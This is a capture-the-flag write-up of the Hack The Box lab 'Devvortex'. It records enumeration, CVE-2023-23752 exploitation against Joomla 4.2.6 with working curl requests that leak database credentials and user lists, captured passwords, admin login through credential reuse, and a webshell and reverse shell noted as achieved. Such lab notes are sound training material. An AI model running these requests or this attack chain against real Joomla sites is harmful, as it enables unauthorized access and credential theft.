# Devvortex

## Target
- **IP:** 10.129.190.60
- **OS:** Linux (Ubuntu)
- **Difficulty:** Easy
- **VHost:** devvortex.htb

## Nmap Scan
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
```

## Services
| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 22   | SSH     | OpenSSH 8.2p1 Ubuntu | Standard SSH |
| 80   | HTTP    | nginx 1.18.0 | Redirects to devvortex.htb vhost |

## Initial Observations
- Generic "web development agency" landing page
- Modern template (likely CMS-based)
- Professional stock imagery and marketing copy
- No obvious tech fingerprints visible in initial view

## Enumeration Results

### VHost Enumeration — SUCCESS

**Attempt 1 (ffuf via direct IP):**
```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:FUZZ -u http://devvortex.htb -H 'Host: FUZZ.devvortex.htb' -fw 4 -t 100
```
**Found:** `dev.devvortex.htb` (Status: 200, Size: 8017)

**Attempt 2 (gobuster via proxy):**
```bash
gobuster vhost -u http://devvortex.htb:8080 -w /tmp/htb-subdomains.txt --append-domain
```
**Confirmed:** `dev.devvortex.htb:8080 Status: 200 [Size: 23221]`

**Subdomain Analysis:**
| VHost | Size | Notes |
|-------|------|-------|
| devvortex.htb | ~18000 | Main marketing site |
| dev.devvortex.htb | 23221 | Different content — likely CMS admin |

**Caddy Proxy:**
- Using pass-through Host header mode
- Confirmed working for vhost enumeration

### Directory Enumeration

**Command — Common paths:**
```bash
gobuster dir -u http://devvortex.htb:8080 -w /usr/share/wordlists/dirb/common.txt -t 50
```
**Found:**
- `/css/` — Static CSS files
- `/images/` — Static images
- `/js/` — JavaScript files
- `/index.html` — Main page

**Command — CMS config files:**
```bash
gobuster dir -u http://devvortex.htb:8080 -w /usr/share/seclists/Discovery/Web-Content/CMS/cms-configuration-files.txt -t 50
```
**Found:** Nothing (empty result)

## Access Instructions

**Add to local /etc/hosts:**
```
100.108.21.107 dev.devvortex.htb
```

**Browse to:**
```
http://dev.devvortex.htb:8080
```

## Analysis
- Main site: Static marketing page (decoy/obfuscation)
- `dev` subdomain: Different content, likely CMS admin panel
- The CMS was hidden on a subdomain, not in a subdirectory

## CMS Identification

**Platform:** Joomla CMS
**Evidence:**
- Cassiopeia template (Joomla 4.x default frontend template)
- Administrator login at: `http://dev.devvortex.htb:8080/administrator/`

**Access URLs:**
- Frontend: `http://dev.devvortex.htb:8080/`
- Admin Panel: `http://dev.devvortex.htb:8080/administrator/`

## Version Discovery — CONFIRMED

**Joomla Version:** 4.2.6
**Source:** `/administrator/manifests/files/joomla.xml`
**Vulnerable to:** CVE-2023-23752 (unauthenticated API access bypass)

**Affected versions:** 4.0.0 - 4.2.7 (patched in 4.2.8)
**CVSS:** 5.3 Medium

## CVE-2023-23752 — Exploitation Path

**Vulnerability:** Improper access control in Joomla REST API. The `?public=true` parameter bypasses authentication checks.

**Status:** ✅ EXPLOITED — See [exploit.md](exploit.md) for full details

**Critical Endpoints:**
| Endpoint | Data Exposed | Status |
|----------|--------------|--------|
| `/api/index.php/v1/config/application?public=true` | Database credentials | ✅ Captured |
| `/api/index.php/v1/users?public=true` | Usernames, emails, groups | ✅ Captured |

**Loot Captured:**
| File | Location | Contents |
|------|----------|----------|
| Database config | `loot/database_dump.txt` | DB user: `lewis`, Pass: `P4ntherg0t1n5r3c0n##` |
| Users enum | `loot/users_dump.txt` | lewis (Super User), logan (Registered) |

**Exploit Commands:**
```bash
# Database credentials
curl -s "http://dev.devvortex.htb:8080/api/index.php/v1/config/application?public=true" \
  -H "Accept: application/vnd.api+json" | jq

# Users enumeration
curl -s "http://dev.devvortex.htb:8080/api/index.php/v1/users?public=true" \
  -H "Accept: application/vnd.api+json" | jq
```

## Credential Reuse Results
| Service | Credentials | Result |
|---------|-------------|--------|
| SSH (lewis) | P4ntherg0t1n5r3c0n## | ❌ Failed |
| Joomla Admin | lewis / P4ntherg0t1n5r3c0n## | ✅ **SUCCESS** |

**Logged in as:** `lewis` — Super User privileges

## Attack Chain
1. ✅ Get DB credentials via API
2. ✅ Get user list via API (lewis = Super User, logan = Registered)
3. ✅ Test credential reuse — **Joomla admin login successful!**
4. ✅ **Edit Joomla template** — Created test.php with webshell
5. ✅ **Get reverse shell** — Connected as www-data
6. [ ] **Privilege escalation** — See [privesc.md](privesc.md)

## Next Steps
- [x] Explore `dev.devvortex.htb` — identify the CMS (Joomla 4.2.6)
- [x] **Identify Joomla version** — 4.2.6 confirmed
- [x] **Research version-specific vulnerabilities** — CVE-2023-23752
- [x] **Exploit CVE-2023-23752** — DB credentials captured
- [x] **Enumerate users** — lewis (Super User), logan (Registered)
- [x] **Test credential reuse** — Joomla admin access achieved
- [x] **Template editing for webshell** — See exploit.md
- [x] **Get shell** — www-data access achieved
- [ ] **Privilege escalation** — Document in privesc.md
